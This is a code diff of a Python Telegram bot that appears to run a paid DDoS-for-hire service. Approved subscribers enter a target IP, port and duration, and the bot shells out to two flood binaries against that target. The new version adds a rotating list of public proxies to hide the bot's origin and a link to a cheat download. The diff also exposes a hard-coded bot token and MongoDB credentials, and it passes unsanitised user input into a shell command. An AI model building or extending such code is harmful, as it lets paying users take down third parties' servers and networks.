@@ -8,193 +8,125 @@ from pymongo import MongoClient
 from datetime import datetime, timedelta
 import certifi
 import random
+from subprocess import Popen
 from threading import Thread
 import asyncio
+import aiohttp
 from telebot.types import ReplyKeyboardMarkup, KeyboardButton
 
 loop = asyncio.get_event_loop()
 
-# Bot Configuration: Set with Authority
 TOKEN = '7942937704:AAFM6qI8dd74bEuSu-E0UUqN0N9FioD4qa8'
-ADMIN_USER_ID = 7083378335
-MONGO_URI = 'mongodb+srv://sharp:sharp@sharpx.x82gx.mongodb.net/?retryWrites=true&w=majority&appName=SharpX'
-USERNAME = "@TREXVIVEK"  # Immutable username for maximum security
+MONGO_URI = 'mongodb+srv://Soul:JYAuvlizhw7wqLOb@soul.tsga4.mongodb.net'
+FORWARD_CHANNEL_ID = -100
+CHANNEL_ID = -100
+error_channel_id = -100
 
-# Attack Status Variable to Control Single Execution
-attack_in_progress = False
+logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 
-# Logging for Precision Monitoring
-logging.basicConfig(format='%(asctime)s - ⚔️ %(message)s', level=logging.INFO)
-
-# MongoDB Connection - Operative Data Storage
 client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
-db = client['sharp']
+db = client['soul']
 users_collection = db.users
 
-# Bot Initialization
 bot = telebot.TeleBot(TOKEN)
 REQUEST_INTERVAL = 1
 
-blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
+blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]  # Blocked ports list
 
-# Asyncio Loop for Operations
 async def start_asyncio_thread():
     asyncio.set_event_loop(loop)
     await start_asyncio_loop()
 
-# Proxy Update Command with Dark Authority
 def update_proxy():
-    proxy_list = []  # Define proxies here
-    proxy = random.choice(proxy_list) if proxy_list else None
-    if proxy:
-        telebot.apihelper.proxy = {'https': proxy}
-        logging.info("🕴️ Proxy shift complete. Surveillance evaded.")
-
-@bot.message_handler(commands=['update_proxy'])
-def update_proxy_command(message):
-    chat_id = message.chat.id
-    try:
-        update_proxy()
-        bot.send_message(chat_id, f"🔄 Proxy locked in. We’re untouchable. Bot by {USERNAME}")
-    except Exception as e:
-        bot.send_message(chat_id, f"⚠️ Proxy config failed: {e}")
+    proxy_list = [
+        "https://43.134.234.74:443", "https://175.101.18.21:5678", "https://179.189.196.52:5678", 
+        "https://162.247.243.29:80", "https://173.244.200.154:44302", "https://173.244.200.156:64631", 
+        "https://207.180.236.140:51167", "https://123.145.4.15:53309", "https://36.93.15.53:65445", 
+        "https://1.20.207.225:4153", "https://83.136.176.72:4145", "https://115.144.253.12:23928", 
+        "https://78.83.242.229:4145", "https://128.14.226.130:60080", "https://194.163.174.206:16128", 
+        "https://110.78.149.159:4145", "https://190.15.252.205:3629", "https://101.43.191.233:2080", 
+        "https://202.92.5.126:44879", "https://221.211.62.4:1111", "https://58.57.2.46:10800", 
+        "https://45.228.147.239:5678", "https://43.157.44.79:443", "https://103.4.118.130:5678", 
+        "https://37.131.202.95:33427", "https://172.104.47.98:34503", "https://216.80.120.100:3820", 
+        "https://182.93.69.74:5678", "https://8.210.150.195:26666", "https://49.48.47.72:8080", 
+        "https://37.75.112.35:4153", "https://8.218.134.238:10802", "https://139.59.128.40:2016", 
+        "https://45.196.151.120:5432", "https://24.78.155.155:9090", "https://212.83.137.239:61542", 
+        "https://46.173.175.166:10801", "https://103.196.136.158:7497", "https://82.194.133.209:4153", 
+        "https://210.4.194.196:80", "https://88.248.2.160:5678", "https://116.199.169.1:4145", 
+        "https://77.99.40.240:9090", "https://143.255.176.161:4153", "https://172.99.187.33:4145", 
+        "https://43.134.204.249:33126", "https://185.95.227.244:4145", "https://197.234.13.57:4145", 
+        "https://81.12.124.86:5678", "https://101.32.62.108:1080", "https://192.169.197.146:55137", 
+        "https://82.117.215.98:3629", "https://202.162.212.164:4153", "https://185.105.237.11:3128", 
+        "https://123.59.100.247:1080", "https://192.141.236.3:5678", "https://182.253.158.52:5678", 
+        "https://164.52.42.2:4145", "https://185.202.7.161:1455", "https://186.236.8.19:4145", 
+        "https://36.67.147.222:4153", "https://118.96.94.40:80", "https://27.151.29.27:2080", 
+        "https://181.129.198.58:5678", "https://200.105.192.6:5678", "https://103.86.1.255:4145", 
+        "https://171.248.215.108:1080", "https://181.198.32.211:4153", "https://188.26.5.254:4145", 
+        "https://34.120.231.30:80", "https://103.23.100.1:4145", "https://194.4.50.62:12334", 
+        "https://201.251.155.249:5678", "https://37.1.211.58:1080", "https://86.111.144.10:4145", 
+        "https://80.78.23.49:1080"
+    ]
+    proxy = random.choice(proxy_list)
+    telebot.apihelper.proxy = {'https': proxy}
+    logging.info("Proxy updated successfully.")
 
 async def start_asyncio_loop():
     while True:
         await asyncio.sleep(REQUEST_INTERVAL)
 
-# Attack Initiation - Operative Status Checks and Intensity
 async def run_attack_command_async(target_ip, target_port, duration):
-    global attack_in_progress
-    attack_in_progress = True  # Set the flag to indicate an attack is in progress
+    # Run both commands simultaneously
+    command_1 = f"./2111 {target_ip} {target_port} {duration} 800"
+    command_2 = f"./ranbal {target_ip} {target_port} {duration} 800"
 
-    try:
-        # Create both subprocesses and await their execution
-        process_2111 = await asyncio.create_subprocess_shell(f"./2111 {target_ip} {target_port} {duration} 800")
-        process_ranbal = await asyncio.create_subprocess_shell(f"./ranbal {target_ip} {target_port} {duration} 800")
+    # Create subprocesses for both commands
+    process_1 = asyncio.create_subprocess_shell(command_1)
+    process_2 = asyncio.create_subprocess_shell(command_2)
 
-        # Wait for both processes to complete
-        await asyncio.gather(
-            process_2111.wait(),
-            process_ranbal.wait()
-        )
-    except Exception as e:
-        logging.error(f"Error during attack execution: {e}")
-    finally:
-        attack_in_progress = False  # Reset the flag after the attack is complete
-        notify_attack_finished(target_ip, target_port, duration)
-
-# Final Attack Message Upon Completion
-def notify_attack_finished(target_ip, target_port, duration):
-    bot.send_message(
-        ADMIN_USER_ID,
-        f"🔥 *MISSION ACCOMPLISHED!* 🔥\n\n"
-        f"🎯 *TARGET NEUTRALIZED:* {target_ip}\n"
-        f"💣 *PORT BREACHED:* {target_port}\n"
-        f"⏳ *DURATION:* {duration} seconds\n\n"
-        f"💥 *Operation Complete. No Evidence Left Behind. Courtesy of {USERNAME}*",
-        parse_mode='Markdown'
-    )
-
-@bot.message_handler(commands=['approve', 'disapprove'])
-def approve_or_disapprove_user(message):
-    user_id = message.from_user.id
-    chat_id = message.chat.id
-    cmd_parts = message.text.split()
-
-    if user_id != ADMIN_USER_ID:
-        bot.send_message(chat_id, f"🚫 *Access Denied. Only {USERNAME} controls this realm.*", parse_mode='Markdown')
-        return
-
-    if len(cmd_parts) < 2:
-        bot.send_message(chat_id, f"📝 *Format: /approve <user_id> <plan> <days> or /disapprove <user_id>. Reserved by {USERNAME}*", parse_mode='Markdown')
-        return
-
-    action, target_user_id = cmd_parts[0], int(cmd_parts[1])
-    plan, days = (int(cmd_parts[2]) if len(cmd_parts) >= 3 else 0), (int(cmd_parts[3]) if len(cmd_parts) >= 4 else 0)
-
-    if action == '/approve':
-        limit_reached = (plan == 1 and users_collection.count_documents({"plan": 1}) >= 99) or \
-                        (plan == 2 and users_collection.count_documents({"plan": 2}) >= 499)
-        if limit_reached:
-            bot.send_message(chat_id, f"⚠️ *Plan limit reached. Access denied. Controlled by {USERNAME}*", parse_mode='Markdown')
-            return
-
-        valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days else datetime.now().date().isoformat()
-        users_collection.update_one(
-            {"user_id": target_user_id},
-            {"$set": {"plan": plan, "valid_until": valid_until, "access_count": 0}},
-            upsert=True
-        )
-        msg_text = f"*User {target_user_id} granted access – Plan {plan} for {days} days. Approved by {USERNAME}*"
-    else:
-        users_collection.update_one(
-            {"user_id": target_user_id},
-            {"$set": {"plan": 0, "valid_until": "", "access_count": 0}},
-            upsert=True
-        )
-        msg_text = f"*User {target_user_id} removed. Clearance by {USERNAME}*"
-
-    bot.send_message(chat_id, msg_text, parse_mode='Markdown')
+    # Wait for both processes to complete
+    await asyncio.gather(process_1, process_2)
 
 @bot.message_handler(commands=['Attack'])
 def attack_command(message):
-    global attack_in_progress
+    user_id = message.from_user.id
     chat_id = message.chat.id
 
-    # Check if an attack is already in progress
-    if attack_in_progress:
-        bot.send_message(chat_id, f"⚠️ *An attack is already in progress. Please wait until it completes, {USERNAME}.*", parse_mode='Markdown')
-        return
-
-    user_id = message.from_user.id
-
     try:
-        # Check user access
         user_data = users_collection.find_one({"user_id": user_id})
         if not user_data or user_data['plan'] == 0:
-            bot.send_message(chat_id, f"🚫 Unauthorized. Access limited to {USERNAME}.")
+            bot.send_message(chat_id, "*You are not approved to use this bot. Please contact the administrator.*", parse_mode='Markdown')
             return
 
         if user_data['plan'] == 1 and users_collection.count_documents({"plan": 1}) > 99:
-            bot.send_message(chat_id, f"🟠 Plan 🧡 is full. Reach out to {USERNAME} for upgrades.")
+            bot.send_message(chat_id, "*Your Instant Plan 🧡 is currently not available due to limit reached.*", parse_mode='Markdown')
             return
 
         if user_data['plan'] == 2 and users_collection.count_documents({"plan": 2}) > 499:
-            bot.send_message(chat_id, f"💥 Instant++ Plan at capacity. Contact {USERNAME}.")
+            bot.send_message(chat_id, "*Your Instant++ Plan 💥 is currently not available due to limit reached.*", parse_mode='Markdown')
             return
 
-        bot.send_message(chat_id, f"📝 Provide target details – IP, Port, Duration (seconds). Controlled by {USERNAME}")
+        bot.send_message(chat_id, "*Enter the target IP, port, and duration (in seconds) separated by spaces.*", parse_mode='Markdown')
         bot.register_next_step_handler(message, process_attack_command)
     except Exception as e:
-        logging.error(f"Attack command error: {e}")
+        logging.error(f"Error in attack command: {e}")
 
 def process_attack_command(message):
     try:
         args = message.text.split()
         if len(args) != 3:
-            bot.send_message(message.chat.id, f"⚠️ *Format incorrect. Use: /Attack <IP> <Port> <Duration>. Maintained by {USERNAME}*", parse_mode='Markdown')
+            bot.send_message(message.chat.id, "*Invalid command format. Please use: /Attack target_ip target_port time*", parse_mode='Markdown')
             return
-
         target_ip, target_port, duration = args[0], int(args[1]), args[2]
 
         if target_port in blocked_ports:
-            bot.send_message(message.chat.id, f"🚫 *Port {target_port} restricted. Select a different entry point. Governed by {USERNAME}*", parse_mode='Markdown')
+            bot.send_message(message.chat.id, f"*Port {target_port} is blocked. Please use a different port.*", parse_mode='Markdown')
             return
 
         asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)
-        bot.send_message(
-            message.chat.id,
-            f"💀 *⚠️ ATTACK INITIATED!* 💀\n\n"
-            f"💢 *SIGMA STRIKE IN EFFECT!* 💢\n\n"
-            f"🎯 *TARGET SET:* {target_ip}\n"
-            f"🔒 *PORT ACCESSED:* {target_port}\n"
-            f"⏳ *DURATION LOCKED:* {duration} seconds\n\n"
-            f"🔥 *Unleashing force. No turning back. Powered by {USERNAME}* ⚡",
-            parse_mode='Markdown'
-        )
+        bot.send_message(message.chat.id, f"*Attack started 💥\n\nHost: {target_ip}\nPort: {target_port}\nTime: {duration}*", parse_mode
+        ='Markdown')
     except Exception as e:
-        logging.error(f"Error in process_attack_command: {e}")
+        logging.error(f"Error in processing attack command: {e}")
 
 def start_asyncio_thread():
     asyncio.set_event_loop(loop)
@@ -202,61 +134,62 @@ def start_asyncio_thread():
 
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
-    # Unique, Intense Menu Options
+    # Create a markup object
     markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=True)
-    options = [
-        "💀 Initiate Attack 🔥", 
-        "🔍 Status Report", 
-        "📜 Mission Brief", 
-        "📞 Contact HQ"
-    ]
-    buttons = [KeyboardButton(option) for option in options]
-    markup.add(*buttons)
 
-    bot.send_message(
-        message.chat.id,
-        f"👊 *Welcome to Command, Agent. Choose your directive.* Managed by {USERNAME}",
-        reply_markup=markup,
-        parse_mode='Markdown'
-    )
+    # Create buttons
+    btn1 = KeyboardButton("Instant Plan 🧡")
+    btn2 = KeyboardButton("Instant++ Plan 💥")
+    btn3 = KeyboardButton("Canary Download✔️")
+    btn4 = KeyboardButton("My Account🏦")
+    btn5 = KeyboardButton("Help❓")
+    btn6 = KeyboardButton("Contact admin✔️")
+
+    # Add buttons to the markup
+    markup.add(btn1, btn2, btn3, btn4, btn5, btn6)
+
+    bot.send_message(message.chat.id, "*Choose an option:*", reply_markup=markup, parse_mode='Markdown')
 
 @bot.message_handler(func=lambda message: True)
 def handle_message(message):
-    if message.text == "💀 Initiate Attack 🔥":
-        bot.reply_to(message, f"*Command received. Preparing deployment. Stand by, {USERNAME}*", parse_mode='Markdown')
+    if message.text == "Instant Plan 🧡":
+        bot.reply_to(message, "*Instant Plan selected*", parse_mode='Markdown')
+    elif message.text == "Instant++ Plan 💥":
+        bot.reply_to(message, "*Instant++ Plan selected*", parse_mode='Markdown')
         attack_command(message)
-    elif message.text == "🔍 Status Report":
+    elif message.text == "Canary Download✔️":
+        bot.send_message(message.chat.id, "*Please use the following link for Canary Download: https://t.me/kidcheat0/734*", parse_mode='Markdown')
+    elif message.text == "My Account🏦":
         user_id = message.from_user.id
         user_data = users_collection.find_one({"user_id": user_id})
         if user_data:
             username = message.from_user.username
-            plan, valid_until = user_data.get('plan', 'N/A'), user_data.get('valid_until', 'N/A')
-            response = (f"*Agent ID: {username}\n"
-                        f"Plan Level: {plan}\n"
-                        f"Authorized Until: {valid_until}\n"
-                        f"Timestamp: {datetime.now().isoformat()}. Verified by {USERNAME}*")
+            plan = user_data.get('plan', 'N/A')
+            valid_until = user_data.get('valid_until', 'N/A')
+            current_time = datetime.now().isoformat()
+            response = (f"*USERNAME: {username}\n"
+                        f"Plan: {plan}\n"
+                        f"Valid Until: {valid_until}\n"
+                        f"Current Time: {current_time}*")
         else:
-            response = f"*Profile unknown. Contact {USERNAME} for authorization.*"
+            response = "*No account information found. Please contact the administrator.*"
         bot.reply_to(message, response, parse_mode='Markdown')
-    elif message.text == "📜 Mission Brief":
-        bot.reply_to(message, f"*For support, type /help or contact {USERNAME} at HQ.*", parse_mode='Markdown')
-    elif message.text == "📞 Contact HQ":
-        bot.reply_to(message, f"*Direct Line to HQ: {USERNAME}*", parse_mode='Markdown')
+    elif message.text == "Help❓":
+        bot.reply_to(message, "*Help selected*", parse_mode='Markdown')
+    elif message.text == "Contact admin✔️":
+        bot.reply_to(message, "*Contact admin selected*", parse_mode='Markdown')
     else:
-        bot.reply_to(message, f"❗*Unknown command. Focus, Agent. Managed by {USERNAME}*", parse_mode='Markdown')
+        bot.reply_to(message, "*Invalid option*", parse_mode='Markdown')
 
 if __name__ == "__main__":
     asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
-
     asyncio_thread.start()
-    logging.info("🚀 Bot is operational and mission-ready.")
-
+    logging.info("Starting Codespace activity keeper and Telegram bot...")
     while True:
         try:
             bot.polling(none_stop=True)
         except Exception as e:
-            logging.error(f"Polling error: {e}")
-            
-
-
-            
+            logging.error(f"An error occurred while polling: {e}")
+        logging.info(f"Waiting for {REQUEST_INTERVAL} seconds before the next request...")
+        time.sleep(REQUEST_INTERVAL)
+        
